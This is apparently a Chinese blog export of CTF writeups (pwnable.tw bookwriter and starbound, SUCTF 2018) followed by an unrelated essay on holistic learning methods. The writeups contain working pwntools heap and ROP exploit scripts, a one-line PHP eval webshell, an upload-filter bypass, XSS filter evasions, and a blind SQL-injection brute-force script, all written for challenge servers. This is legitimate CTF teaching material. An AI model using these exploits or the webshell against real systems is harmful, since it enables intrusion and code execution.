0x3a0fake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c4520 - 0x10)#3c4520 D _IO_list_all,fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(1) * 18 + p32(0x80000000) + "a" * 0x14fake_chunk += p64(heap + 0x17e0)fake_chunk = fake_chunk.ljust(0x200, "\x11")payload += fake_chunkpayload += p64(libc + 0x45390) * 0x10edit(0, payload)r.sendline("1")r.sendline("16")#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() 另一个思路:unsorted bin attack修改堆指针为main_arena,修改top chunk任意地址分配,但发现一样会面临之前的问题,payload太长. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384from pwn import *context.log_level = 'debug'def add(size, content): r.sendline("1") r.sendlineafter("Size of page :", str(size)) r.sendafter("Content :", content) r.recvuntil("Your choice :")def view(index): r.sendline("2") r.sendlineafter("Index of page :", str(index)) r.recvuntil("Content :\n") data = r.recvuntil("Your choice :") return datadef edit(index, content): r.sendline("3") r.sendlineafter("Index of page :", str(index)) r.sendafter("Content:", content) r.recvuntil("Your choice :")def info(): r.sendline("4") r.recvuntil("Author : ") data = r.recvuntil("Do you want") r.sendlineafter("(yes:1 / no:0) ", str(0)) return data#r = process("./bookwriter")#r = process("./bookwriter", env = &#123;"LD_PRELOAD" : "./libc_64.so.6"&#125;)r = remote("chall.pwnable.tw", "10304")r.sendafter("Author :", "a" * 0x40)r.recvuntil("Your choice :")info()add(0x18, "a" * 0x18)#0heap = u64(info()[0x40:].split("\n")[0].ljust(8, "\x00")) - 0x1020#leak heapadd(0x18, "a" * 0x18)#1edit(1, "a" * 0x18)edit(1, "a" * 0x18 + "\xb1\x0f\x00")add(0x1000, "a" * 1)#2#free(top_chunk)add(0x10, "a" * 0x8)#3libc = u64(view(3).split("a" * 0x8)[1][:6].ljust(8 , "\x00")) - 0x3c4188#leak libcadd(0x8, "a" * 0x8)#4add(0x8, "a" * 0x8)#5add(0x8, "a" * 0x8)#6add(0x8, "a" * 0x8)#7edit(0, "\x00")add(0x8, "a" * 0x8)#8#overlop ptr sizepayload = p64(libc + 0x45390) * 0x1e#fake_vtablefake_chunk = "/bin/sh\x00" + p64(0x61)fake_chunk += p64(0) + p64(libc + 0x3c4520 - 0x10)#3c4520 D _IO_list_all, 3c5520 D _IO_list_all.#fake_bk = _IO_list_all - 0x10fake_chunk += p64(0) + p64(1) + p64(0) * 18 + p32(0xffffffff) + "\x00" * 0x14#_IO_write_base, _IO_write_ptr, padding, _mode, _unused2fake_chunk += p64(heap + 0x1020)#fake_vtable_ptr#fake_chunk &lt;=&gt; fake_IO_FILEpayload += fake_chunkedit(0, payload)edit(0, "\x00")r.sendline("1")r.sendlineafter("Size of page :", str(0x10))#gdb.attach(r)print "libc: " + hex(libc)print "heap: " + hex(heap)r.interactive() starbound 未检查index的值,bss段向上找到cmd_set_name函数,通过add_esp_0x1c_ret进行rop即可. 12345678910111213141516171819202122232425262728293031323334from pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']#r = process("./starbound")r = remote("chall.pwnable.tw", "10202")add_esp_0x1c_ret = 0x8048e48p3_ret = 0x80494dap1_ret = 0x80491bcr.sendlineafter("&gt; ", "6")r.sendlineafter("&gt; ", "2")payload = p32(add_esp_0x1c_ret) + "a"r.sendafter("your name: ", payload)r.sendlineafter("&gt; ", "1")payload = str((0x80580d0 - 0x8058154) / 4)payload = payload.ljust(0x8, "\x00")payload += p32(0x8048b90) + p32(p1_ret) + p32(0x805509c)payload += p32(0x8048a70) + p32(p3_ret) + p32(0) + p32(0x805509c) + p32(0x12)payload += p32(0x8048b90) + p32(0) + p32(0x80550a0)r.sendafter("&gt; ", payload)libc = u32(r.recv(4)) - 0x5fca0print "libc: " + hex(libc)payload = p32(libc + 0x3ada0) + "/bin/sh\x00"r.send(payload)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-suctf-2018-招新赛]]></title>
    <url>%2Fposts%2Fc9b1afe3%2F</url>
    <content type="text"><![CDATA[web where are you from level1 修改HTTP头伪造IP. php里有三个值保存客户ip,分别是HTTP_CLIENT_IP,HTTP_X_FORWARDED_FOR,REMOTE_ADDR. $_SERVER['HTTP_CLIENT_IP']如果有代理服务器,一般是代理服务器ip,没有则为空. $_SERVER['HTTP_X_FORWARDED_FOR']如果有代理服务器的话,一般是原始ip,没有则为空,若有多个则也显示代理服务器ip. $_SERVER['REMOTE_ADDR']如果有代理服务器的话,则为最后一个代理的ip,没有则为连接的客户端ip. 前两个都是可以伪造的,最后的一个很难伪造.$remote_addr是nginx的内置变量,代表了客户端真实(网络传输层)IP. 此题抓包添加Client-Ip: 127.0.0.1即可. include me 文件包含漏洞源于网页后端php(或其他)代码中使用了include等文件包含语句,而且所包含的文件由变量控制,此变量又能通过GET或POST等方式进行修改所造成的. 通过PHP内置协议直接读取代码:http://xxx.com/index.php?file=php://filter/read=convert.base64-encode/resource=xxx.php获得xxx.php的代码的base64加密结果. Easy_upload 只能传png,尝试修改Content-Type为image/png,成功.php后缀被拉黑名单,尝试php5,成功. 过滤&lt;?php,使用&lt;script language="pHp"&gt;@eval($_POST['flag'])&lt;/script&gt;.获得webshell. onepiece hint是phpstorm,使用phpStorm开发的程序目录下会有一个.idea文件夹用于存储配置文件/.idea/workspace.xml. 获得一个zip,打开是一个加密的PHP,解密,逻辑里面设置了flag变量,然后会打印$$filename.猜测是upload.php的部分源码,上传一个名字为flag的文件,获得flag. baby upload 这次是客户端限制,上传1.png,抓包改名为1.php5(避免黑名单),获得flag. xss1 "+alert(1)+",alert被过滤,使用JSFuck. xss2 不准使用(),将括号变成[][+[]]. php is No.1 当有两个is_numeric判断并用and连接时,and后面的is_numeric可以绕过,=优先级比and高,num='a'绕过. int()会把4e5理解成4,绕过. Classic Sqli 用\转义',然后用正则爆破密码. 123456789101112131415import stringimport requestsimport rechar_set = '0123456789abcdefghijklmnopqrstuvwxyz'pw = ''while 1: for ch in char_set: url = 'http://49.4.68.67:89/?user=\\&amp;pw=||pw/**/regexp/**/"%s$";%%00' url=url%(ch + pw) r = requests.get(url) if 'Bonjour!, admin' in r.text: pw = ch + pw print(pw) break if ch == 'z' : break where are you from level 2 Client-Ip处的注入,过滤了空格和一些关键字,但是关键字只过滤了一次,因此可以双写绕过. Client-Ip: 12',(selselectect/\*\*/fl4g/\*\*/ffromrom/\*\*/flaaag))#. pwn unlink take_node时越界,直接unlink攻击,修改free@got. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *buf = 0x6020C0free_got = 0x602018def touch(size): r.sendline('1') r.sendlineafter('size : \n', str(size)) r.recvuntil('chooice :\n',timeout = 1)def modify(index, payload): r.sendline('4') r.sendlineafter('modify :\n', str(index)) r.sendafter('content\n', payload) r.recvuntil('chooice :\n',timeout = 1)def delete(index): r.sendline('2') r.sendlineafter('delete\n', str(index)) r.recvuntil('chooice :\n',timeout = 1)def show(index): r.sendline('3') r.sendlineafter('show\n', str(index)) r.recvuntil('is : \n') data = r.recvline() r.recvuntil('chooice :\n',timeout = 1) return data#r = process(['./pwn'], env=&#123;"LD_PRELOAD":"./libc-2.23.so"&#125;)r = remote("43.254.3.203","10005")r.recvuntil('chooice :\n',timeout = 1)touch(0x90)touch(0x90)touch(0x20)delete(0)touch(0x90)libc_base = u64(show(0)[-7:-1].ljust(8,'\0')) - 0x3c3b78print hex(libc_base)payload = p64(0) + p64(0x91) + p64(buf - 0x18) + p64(buf - 0x10) + "a"*0x70 +p64(0x90) + p64(0xa0)modify(0,payload)delete(1)#buf = &amp;buf - 0x18payload = p64(free_got)*4 + p64(0x6020d8)*2 + "/bin/sh"modify(0,payload)modify(0,p64(libc_base + 0x45390))#gdb.attach(proc.pidof(r)[0])r.interactive() easy_overflow_file_structure 漏洞点在于一次写入后没有break跳出循环,可以多次写入. 1234567891011121314from pwn import *#p = process("./eofs")p = remote("43.254.3.203", 10002)payload = "GET / HTTP/1.1#"payload += "Host:" + "a" * 0x7e + "#"payload += "Username:" + "a" * 0x7e + "#"payload += "ResearchField:" + "a" * 0x7e + "#"payload += "ResearchField:" + "cc" + p64(0x602188) + p64(0xdeadbeef) + "#"print payloadp.sendline(payload)print p.recv()p.interactive() EZ_heap 首先利用unsorted bin进行泄露,发现存在uaf,double free之后利用fastbin attack写__malloc_hook. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *context(os="linux", arch="amd64")elf = ELF("./pwn")libc = elf.libcdef add(size,name,kind): r.sendline('1') r.sendlineafter('name :', str(size)) r.sendafter('animal :', name) r.sendlineafter('animal :', kind) r.recvuntil('choice : ',timeout = 1)def check(): r.sendline('2') data = r.recvuntil('choice : ',timeout = 1) return datadef delete(index): r.sendline('3') r.sendlineafter('cage:', str(index)) r.recvuntil('choice : ',timeout = 1)def clean(): r.sendline('4') r.recvuntil('choice : ',timeout = 1)r = process(['./pwn'])#r = remote("43.254.3.203","10006")r.recvuntil('choice : ',timeout = 1)add(0x90,"0","222")#0add(0x90,"0","222")#1add(0x90,"0","222")#2add(0x90,"0","222")#3add(0x90,"0","222")#4delete(1)delete(2)add(0x90,"0","222")#5libc_base = u64(check()[0xb3:0xb9].ljust(8,'\0')) - 0x3c4c30print "libc_base: " + hex(libc_base)malloc_hook = libc_base + libc.symbols["__malloc_hook"]print "malloc_hook: " + hex(malloc_hook)one_gadget = 0xf02a4 + libc_baseprint "one_gadget: " + hex(one_gadget)add(0x30,"0","222")#6#the heap is all inuseadd(0x68,"0","222")#7add(0x68,"0","222")#8add(0x20,"0","222")#9delete(7)delete(8)delete(7)add(0x68,p64(malloc_hook - 0x23),"222")add(0x68,"0","222")add(0x68,"0","222")add(0x68,"0" * 0x13 + p64(one_gadget),"222")delete(7)delete(7)r.interactive() misc single dog 看hint可知应该是两个文件,binwalk一下,使用winhex通过偏移获得ZIP文件get flag. 佛家妙语 先与佛论禅. 然后按提示base64,base32,base16,base58. stature 明显是改图片高,把1改成2获得flag. dead_z3r0 打开,前面一部分为字符串,后面一部分夹杂python函数名,把后面截出,反编译得以下代码. 12345678910111213141516171819def encryt(key, plain): cipher = '' for i in range(len(plain)): cipher += chr(ord(key[i % len(key)]) ^ ord(plain[i])) return cipherdef getPlainText(): plain = ''def main(): key = 'LordCasser' plain = getPlainText() cipher = encryt(key, plain)if __name__ == '__main__': main() 写出解密脚本获得提示stegosaurus.使用stegosaurus处理反编译前pyc获得flag.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Self-关于学习]]></title>
    <url>%2Fposts%2Fb47c0aa0%2F</url>
    <content type="text"><![CDATA[cws学习法 一套正在不断完善的学习方法，仅供参考。里面用到的学习方法都在后面解释过。 大部分记忆法或者学习法的根本原理就是：在知识与知识之间建立尽可能多且正确的联系，从而最大限度的记忆，理解，应用知识并创造新的知识。 准备工作 简要确定学习的对象和范围，你学习的目标是什么？学习的目的是什么？有没有别人学习的经验，有的话就进行参考。 根据上一步获取的信息寻找相应的书籍，课程，PPT，博客等，还有就是习题或者实践环境。 学习方法 学习一个新知识时，首先要判断信息主要属于哪一类，确定信息的类型可以帮助决定学习时采用什么技巧。知识结构也有强弱之分，如有可能，应当尽量使用强结构。 随意信息结构 随意信息结构（缺少内在联系和逻辑结构）是最弱的结构，难以进行整体性学习，学习起来时间长，而实际应用价值又很局限。要尽量找出随意信息中的逻辑结构（于无序中寻有序）帮助记忆。 例如：现在有一系列名词要记住，看起来是很随意的信息，但你要努力寻找它们可能存在的逻辑关系，比如第一个字都是三点水旁？这就是一种逻辑关系。如果实在找不到逻辑关系，也可以试试比如联想法，图表法，比喻法，内在化（也就是常说的记忆宫殿之类的），挂钩法和信息压缩技术，也包括思维导图等新兴工具。 随机信息的练习方法包括制作anki卡片进行测试与复习，试着创建新的联系等。 具体信息结构和过程信息结构 具体信息结构和过程信息结构是最强的信息结构，二者会唤起你的实际经验。新的知识可以与旧的经验很好地联系起来，编写程序包括了具体信息结构和过程信息结构，修改程序后的结果会立即反馈给你，各种概念不断地出现在脑海中。 具体信息结构和过程信息结构可以通过实践来模拟或者重现加深对知识的掌握。 抽象信息结构 抽象信息的理解只是开始，但也是整个学习过程的基础，可以将其分为三步。 第一步，通过选择好的教科书或者网课进行全面系统的学习，对于每一个概念都要理解，并建立基础的知识体系。 由于抽象信息本身就具有逻辑结构，所以可以很方便的利用思维导图，图表法等方法进行总结和记忆。 第二步，在理解之后对知识点进行提炼，也就是建立模型，这一步中可以参考一些额外的参考书和资料，包括他人的总结，但一定要自己提炼，得出自己的见解，总结出自己的模型。 这一步中可以以比第一步更小的周期进行推进，学习子目标，总结知识点（思维导图，笔记等），实践（写题目，解决问题），总结实。 第三步，就是将该知识体系进行拓展（纵向，横向，深度）与应用，同时以思维导图，笔记等输出为基础，开始查漏补缺，纠错，寻找知识盲点。这一步开始就是一个漫长的过程，最好的状态就是整个学科在你的脑海当中有一套完整的体系。 总结 输出方法：博客，思维导图，goodnotes（方便同步保存和修改），latex读书笔记。 关键点：基础很重要，知识体系都是建立在基础之上，这里的基础主要指定理，定律，概念；知识体系的建立；通过输出查漏补缺，发现盲点并进行纠错；最后进行拓展和应用。 核心点：一切的一切，最关键的点在于学习过程的思考（建立联系）。 心态 主动选择 + 正向思维 + 正确的目标 + 正反馈 + 更大的格局。 要避免一味的为爱发电，浓厚的兴趣是好的起点，良好的正反馈是前进的助推剂。 心态调节的方法：一是积极的心理暗示，二是外部的不断鼓励。一定要对自己的智商充满信心，并且对自己能力深信不疑。 看书和学习不可浮躁，要保持一个平稳的学习状态，将学习变成常态。 学习的动机越强烈，学习的意义越深远，学习的目的越远大，对知识的理解必将更加深刻。 要想超出知识本身，光有热情还不够，你要寻找各种应用知识的途径（即使现在讨厌它），知识因用而获得新的意义。整体性学习中最关键的步骤是将所学的知识运用到实际中去，知识只有获得了在实际生活中的价值才是真正的知识。只要你用心发现，几乎所有的知识都有实际价值，如果能发现知识在你生活中的价值。 工具 记忆工具：基于遗忘曲线的Anki。 一些认知理论 第一性原理 第一性原理是一种演绎法思维，指通过已有定律进行不外加假设与经验拟合的推导与计算，找出问题的答案；经验参数是一种归纳法思维，由大量已知的数据或现象，假设出一个规律并实践加以验证。 追本溯源法是从问题出发，一步步分析问题背后的原因，直到找出最终原因，在思考如何解决问题，所以追本溯源是解决问题的前奏，而第一性原理和经验参数就是解决问题的过程。 但是第一性原理只能解决该原理延伸范围内的问题，有些问题需要多个原理作为起点一起推演，这就需要进行跨学科学习。 学习金字塔 听讲。 阅读。 视听。 演示。 讨论。 实践。 教授给他人。 整体性学习法 整体性学习理论 整体性学习在于创造知识的网络，通过将知识简化成一个个模型，然后组织成一个个知识体系，同时通过一个知识体系的知识与另一个知识体系的知识相互联系来加强理解和记忆。 整体性学习的基础就是将知识关联起来以达到记忆，理解和应用的目的。 开始学习的最佳技术是比喻法（通过两种知识的相似点建立联系从而深化记忆）、内在化（通过一种知识去解释另一种知识）、基于流程的记事（将多个知识按一定的顺序组成一件事）和画图表法，这些方法构成了整体性学习的基础。 事实上，知识的学习从来就不是孤立的，学习任何新的知识（概念、定义、公式、问题、观念、理论等）都需要联系已经学习了的知识。创造的联系越多，它们就会记得越牢、理解得越好。 不断地建立联系就是提升学习效果的最好方法。 知识在大脑里的存在方式 整体性学习基于三种主要观点：模型，结构（体系），结构间联系。 模型 模型是高度相关知识的提炼，聚合，压缩，是结构的基础单元，更为简单和更易储存。 模型有很多种形式，但是目标总是同样的：那就是压缩信息。通过将一些核心概念联系在一起，就可以创建一个模型。模型并不一定是一张图，但一定是一种压缩形式，它把多个关键思想压至一处。其关键就是使该概念带来的信息负担最小化。 比如比特流到机器代码数据这一过程，其实就是信息的位表示，通过比特位的排列组合，不同排列代表不同意思，通过公式进行映射，再精炼一次就是位与上下文。 结构 结构就是一系列紧密联系的知识模型之间互相联系形成的系统。 知识结构/知识体系是关于某个学科的知识之间联系的总和，就像知识大厦组成的城市。建立一个知识结构的过程，其实就是在各种知识模型之间建立联系的过程，每学习一个新概念，都要与其他知识相联系。 比如学习多元函数微积分时与一元函数微积分联系，学习乘法时与加法进行联系。有些联系是富有逻辑性的（比如数学，物理）；有些联系是部分相关的（比如历史中每个朝代的开国皇帝）； 最典型的成熟结构：感知结构，关系结构，基础数学结构，基础语言结构。 结构间联系 人大脑中的知识体系有很多，它们发达的程度不一，就像沿海发达城市与内陆普通城市。 英语好的人学习英语的速度一定比英语不好的人学习英语的速度快，就像发达城市的经济增长量会远超内陆普通城市。 同样的，可以通过发达的知识体系去建设不发达的知识体系，也就是通过结构间联系。 例如，通过经历去记忆，因为人从出生开始就丰富自己处理现实经历的知识体系，其中很重要的一部分就是感知结构，常说的记忆宫殿，图像法就是基于这一原理。更普遍的，可以利用你大脑中所有的知识来记忆，学习，理解新的知识。 pooling这个单词，pool表示池塘，加ing表示动的池塘，也就是河，三国时期有一个陆逊在长江附近火烧联营破了刘备的大军，所以pooling的意思是联营。这就是最普适的方法，联想法，就是通过联系，有的是强联系，有的是弱联系。这种方法是非常随性的。比如这个例子里：也可以由ing可以想到营（ying）。 最重要的在于，当你回忆pooling时，你就会想起这一个联系，然后火烧联营这一历史事件的知识也就被你再次记忆，这就是联想法的好处，一次记忆多个知识点。 总结 模型，结构，结构间联系的建立都是持久且反复迭代的，也就是纠错和检测过程。 如果将大脑当作一个国家，不同的知识体系就是不同的城市，城市中的建筑通过公路相连，城市与城市之间通过高速公路相连，这样整个大脑就能整体性的运作起来，获得更大的效率。 ps：结构间联系能激发创造力，跳出盒子之外思考最恰当地描述了那些在结构之外思考的人们，这就是创造。利用高速公路可以在专业交叉的领域建立起新的结构，这种不同专业间的联系好处是，它比用生活经验来联系更容易产生新知识。 整体性学习的顺序 整体性学习的顺序： 1. 获取：阅读、听课以及个人的种种经历都是获取。获取阶段的目标是获取的信息要准确，信息量要尽量压缩/提炼，这一步会形成模型。 2. 理解：理解就是了解信息的基本意思，并放在上下文中联系，这是知识的最基本联系，这一步就会完善模型并与知识体系联系和结合。 3. 拓展：拓展阶段是整体性学习中最花力气的地方，这一步将形成模型间联系、结构间联系和更广泛的联系。 4. 纠错：纠错阶段是在模型，知识体系和结构间联系中寻找错误，这个阶段要删除那些无效的联系并调整模型。 5. 应用：应用把纠错带入最后的水平，通过比较（知识）信息是如何在现实中运行的来进行调整，实践是检验真理的唯一标准。 还有一个测试步骤是伴随上述每一步的。测试就是观察以上五个步骤做得好不好，严格的测试能发现问题出在哪里。这五个顺序并非按部就班，只是大体按此顺序进行，不能拘泥于这种顺序。 获取阶段 获取信息时有三个主要目标： 1. 简化，简化表示在获取的信息中将无用的东西尽量删除。 2. 容量，获取尽可能多的信息，只读一句话当然没有读完一页理解得透彻，知道得越多，理解得就越深。 3. 速度，速度看起来与容量和简化相反，读得越快，漏掉的信息就越多，信息获取也越差。 理解阶段 在理解阶段，只是理解了信息的基本意思并与上下文进行简单的联系，也就是形成了模型和结构中简单的联系。死记硬背式的学习仅仅是理解阶段的学习。 然后需要了解这个公式是怎么得来的，它与其他公式的关系（拓展），以及怎样用它解决外面世界的各种问题（应用）。 当遇到比较难的课程时，首先尝试将其分解为更小的问题、缩小范围，搞清楚真正不能理解的地方，然后才深入阅读，跨过障碍。 拓展阶段 拓展才是整体性学习的真正开始。在这个阶段要应用模型来丰富和扩展结构，同时也要拓展对信息的理解，包括信息的由来以及与其他信息是怎么联系在一起的。 拓展有三种主要方式：深度拓展、横向拓展和纵向拓展。 深度拓展：知识的背景探究，知识从何而来？结论来自何处？一个发现是如何做出的？事物为什么以这种方式存在？深度拓展需要在信息内部创造联系。不是仅仅理解一个结论就结束了，要进一步理解结论之前的试验，试验是怎么做的？是谁做的？怎么想起来做的？如此这般之后，结论就建立在与其他相关知识联系的基础之上了。深度拓展的缺点是需要很多探索。有些学科本身提供了一定程度的深度拓展，但是往往深度不够；有的学科根本就没有提供，只是孤零零的结论。深度拓展可能是牢牢锁定知识的最佳方法，但是同时也是最花时间的工作。 横向拓展：知识不会孤立地存在，与此类似的结论还有哪些？是哪些地方类似？不同的地方在哪里？同一时期还有哪些其他的发现，同一个发现者还有哪些发现，在同一领域里还有哪些发现？围绕这一结论有哪些其他的事实？横向拓展需要在知识周围建立联系，通常意味着你需要建立模型，在模型与原知识之间建立联系。比如将发生在古希腊的一件事与另一件发生在古代中国的事情联系起来。 纵向拓展：知识都遵循一定的模式，同样的模式在其他知识中也会见到，你能将一个公式与一个自然事件相联系吗？比如水的流动或是驾驶汽车？如果这个发现与一个看起来完全不相关的历史事件联系在一起，你能发现什么类似之处吗？纵向拓展有相当的难度，也是最有创造性的学习方式。但是，如果运用得当，其速度要比深度拓展中探究知识的背景快得多。比喻法和内在化是进行纵向拓展的最好方法。纵向拓展要求在结构间建立高速通道，它有益于创造性思考。纵向拓展就是前面特别强调的比喻法，也是整体性学习的核心。深度拓展和横向拓展虽然没有比喻法快捷、简单，却是实实在在的知识拓展。 你正在探究知识的基础背景吗？正在将知识与其他类似知识相联系吗？还是你正在一种知识与另一种完全不相关的知识之间建起一道道高速公路？ 画画图表会帮助你进行纵向、横向和深度拓展。比喻法和内在化对于纵向拓展效果极佳。不过，整体性学习并不需要追求标新立异，只要保持好奇心以及不断地追问，你就会拓展知识。 纠错阶段 纠错可以看作在整体性知识网络中做修剪工作，添加一些特殊的例子，删除一些现实中不存在的联系，这不是一个完美的过程，修剪工作是必要的。 纠错可以采取多种方法，包括阅读那些与你观点相反的书籍，以及把结论放入现实世界中看看等方法，纠错的最终途径就是实践。 应用阶段 应用是学习的最终目的，能做到学以致用方能更好地适应现实世界。如果你学习税法并用到自己的企业管理中，那肯定比纸上谈兵学得好。如果你学习统计学，又把学到的知识用在实验设计上，那你对统计学的理解一定更深刻。不过应用的目的又岂止是更深刻地理解，深刻地理解只是副产品，学习的本来目的就是应用于实践。 理论运用到现实世界中的过程既是练习的过程也是创造性解决问题的过程。知识中的很大一部分存在于潜意识中，这部分知识如果不去运用就得不到很好的发展。读了图书馆里所有的管理学书籍也只是理解了管理学的概念，如果能亲自管理企业，那么对概念就不仅仅是理解，而且是一种感觉。 创造新的途径，将所学的知识应用到生活中去，这是整体性学习的最后环节，也是最终目的。 测试阶段 无论五个阶段中的哪一个都需要进行测试。不管你何时尝试新的方法，知识都有可能发生丢失和误解的现象。 测试可以让你了解弱点是什么，该如何改进它。通过测试要确定你对知识的理解到了什么层次？以下是你需要问自己的一些问题。 获取阶段的测试──我以前看过或听过这个知识吗？ 理解阶段的测试──我理解知识的含义吗？（至少是字面上的意思。） 拓展阶段的测试──我知道知识从何而来，与哪些知识有关系吗？ 纠错阶段的测试──我删除了那些不恰当的联系吗？我删除了那些错误结论吗？ 应用阶段的测试──我将知识用到实际生活中了吗？ 测试并不是什么复杂过程，但是它需要很强的自我意识，请再读一遍五个阶段的定义，对照定义进行检查，这样你会更清楚自己到底处于哪个阶段。 整体学习顺序小结 整体性学习的顺序并不是一成不变的线性顺序，步骤之间可以往返，也可以跳跃。理解之后可以再去获取，拓展之后可以不经过纠错，而直接跳到应用，记住它是多线性的而不是单线性的。 不要迷信五个步骤，认为必须如此，要相信现实世界，而不要迷信理论，现实世界中，有几个学习者会一定要纠错好了，再去应用？可笑的是就有人本末倒置，将理论奉为圣经，不可违背，于是这世间就有了教条主义。 知识结构的类型 不同学科的知识并不相同，历史课上你要记住一大堆日期；程序设计课上你要了解什么是多态性。不同的知识有不同的结构类型，虽然学习的过程是类似的，但是知识结构的类型却不一样。 随意信息，观点信息，过程信息，具体信息，抽象信息。这五类信息基本上涵盖了学校里的课程和实际生活中能遇到的所有信息类型。有些信息介于两种类型之间，比如物理学游走于抽象信息和具体信息之间，生物学则可能既有随意信息又有具体信息。实际上，大多数学科都是上述各种信息的组合，不过是比例不同。 随意信息 随意信息是一系列事实、日期、定义或规则，它们缺少逻辑分类，比如人有206块骨头等。这些知识看起来没有规律，无法再加工。需要死记硬背的知识就是随意信息。 对待随意信息，假如存在某种逻辑关系，那么尽量去发现它，否则记忆和使用信息的工作会更加困难。可以采取：联想法，挂钩法，压缩法。 观点信息 观点信息是存在争论的信息。小乘佛教和大乘佛教哪一个更优秀？这就是观点，观点信息在论文中很常见，关于这类信息，大家的意见不一致，而当你需要做决定时却非常重要。 对于观点信息，最大的难点在于获取阶段。你需要检查大量的信息以寻找其中的模式，而不是去记忆具体的细节。速读技巧对于收集信息非常重要。 图表法对于观点来说也是非常有用的方法，它能帮助你在阅读以后提取出关键思想。 过程信息 过程信息是教导你怎么行动的信息，是讲述一系列动作、操作的信息。比如，讲述如何游泳的知识，编写一段电脑程序，建造一所房子以及设计一个模型都依赖于过程信息。 学习这类信息最重要的是不断练习、反复去做。 不过，建立正确的背景概念对于节约时间也同样关键。大多数过程信息都依赖于正确的模型，通过练习可以慢慢形成一个结构，如果有正确的模型则可以提高学习速度，以下是一些可以改进模型的技术：内在化，比喻法，图表法，模型纠错。 过程信息的最大难点是需要实际投入大量的时间用于练习。你可以对概念理解得不好，但是必须实际地掌握动作。你无须全部学习材料，只要拥有正确的背景模型，就可以练习那些教你的动作。 过程信息的好处是：如果练习了，它比其他类型的信息记得更牢，保存时间更长。通过练习，你可以将模型与知识结构更好地融合在一起。 具体信息 具体信息是那些在实际中可以观察到、听到、触到的信息，比如医学上的视、触、叩、听得到的信息就是具体信息，不过实际上，大多数信息都介于抽象和具体之间。 生物学可能是比较具体的科目，有大量真实的图像，你不需要做更多的视觉化工作，因为艺术家和自然本身已经做好了这种工作。不过生物学也有酶、神经元、蛋白质结构、化学反应等难以想象图像的知识，所以生物学也是一门抽象学科。 根据马哲的认识论，所有的认识最开始都起源于实践，所以在具体信息中信息量总量从大到小（也就是记忆力强弱）：经历 &gt; 视频 &gt; 图片 &gt; 音频 &gt; 文字。 抽象信息 抽象信息缺少与感官的直接联系。数学、物理、心理学、计算机和化学主要涉及的是抽象信息。 抽象信息与随意信息正好相反。抽象信息非常难以理解，但是逻辑性很强，学习时好比潜入深海的探索，随意信息则非常浅显，但是逻辑性差。 在处理抽象信息时，你需要将之移到具体的层次，整体性学习者一般会抛弃课程中的随意信息。内在化和比喻法对于将复杂知识简化至关重要，模型纠错也很重要，因为一开始建立的模型总是存在各种各样的错误。 对抽象信息来说，理解和拓展阶段显得难以忍受。假如你感到理解困难，可以降低接受信息的速度，将前面的信息深入仔细地探究。这种知识的特点是一环接着一环，所以打好基础至关重要。 在学习抽象信息时，整体性学习优势明显。通过将信息转化为更容易想象成图像的形式，你可以为知识建立广泛的联系。内在化和比喻法是两种主要的办法。 整体性学习技术 获取知识：快速阅读，笔记流。 联系观点：比喻，内在化，图表法。 随意信息的处理：联想法，挂钩法，信息压缩技术。 知识扩展：实际应用，模型纠错，以项目为基础的学习。 快速阅读 参考书籍：《快速阅读突破》（Breakthrough Rapid Reading）。 三种主要的方法：指读法，练习阅读法，积极阅读法。 指读法：使用手指会让眼睛停留在你要阅读的地方，还能通过调整手指移动的速度来控制阅读的速度。 练习阅读法：练习阅读的唯一目的是训练自己以尽可能快的速度理解所读内容。通过阅读一本从未读过的书来练习阅读，在书上做一个标记，设定3分钟，然后用指读法从标记开始，以稍快于自己能读懂内容的速度进行阅读，3分钟一到，停止阅读，再做一个标记。通过降低阅读速度练习，你可以提高自己的理解能力，以实现最快的阅读速度和最好的理解能力。 积极阅读法：实际上积极阅读与快速阅读是对立的。积极阅读强调深入地理解材料，所以自然降低了阅读速度。积极阅读不仅仅是简单地在书上画各种颜色的记号和在空白处写一写心得体会，而是将知识点真正地整合在一起。开始积极阅读时，准备好要读的书和笔记本，在笔记本上写下每章的标题和亚标题，每读完一小部分时（指读法），在笔记本上记一些笔记。进行积极阅读时需要记下：这一节中主要观点是什么？我怎样才能记住主要观点？我要怎样将主要观点拓展开以及应用它。第一个问题仅仅促使你完整地获取信息；第二个问题迫使你对信息进行联系、视觉化和比喻法；第三个问题要求你将信息应用在不同的情境中。这三个问题迫使你将每个知识点都要经过整体性学习里的理解、拓展和应用三个阶段。 笔记流 使用笔记流时，首先写下最主要的观点，尽量用很短的单词来替换完整的句子，这可能会降低可读性，但是提高了上课时的学习效率。事实、日期、细节和描写要尽量减少单词量，不要写冗长的段落。一旦你写下了一个观点，下一步就是在这个观点和其他观点之间画上一些箭头，观点不是建立成金字塔式的结构，而是呈现出相互关联的关系，这个过程与实际的整体性学习策略类似，观点连在一张网中。 把笔记流当作一种工具，以更好地使用其他的学习技术。比喻法、图表法以及信息压缩技术都可以与笔记流相结合，通过笔记流，你可以写下各种主要的观点，也可以将观点与图像、图表以及其他主题相联系。 记好笔记流的一个关键能力是知道哪些知识是重点，也就是要利用信息压缩技术来压缩信息，获取关键字。 比喻法 比喻法就是在不熟悉的知识和熟悉的知识之间架起一座沟通的桥梁。比喻在文学中主要提供视觉上的相似，而在整体性学习中联系的是类似的过程：事件或者信息的顺序。 比喻法不必拘泥于二者有多么相似，只要有一点相似，不管是视觉、听觉、触觉还是直觉，也不管是原理、目的还是过程，都可以拿来比喻，比喻法也就是建立模型的方法。 可以按照下面三个简单步骤找出一个比喻。 1. 确定你要深入理解和记忆的信息，如经典条件反射。 2. 在你的个人经验中寻找与信息部分相似的东西，要达到完全符合不太可能，所以与其寻找一个完全符合的东西，不如稍作让步，找到十几个部分符合的不完美比喻，如雪中行走。 3. 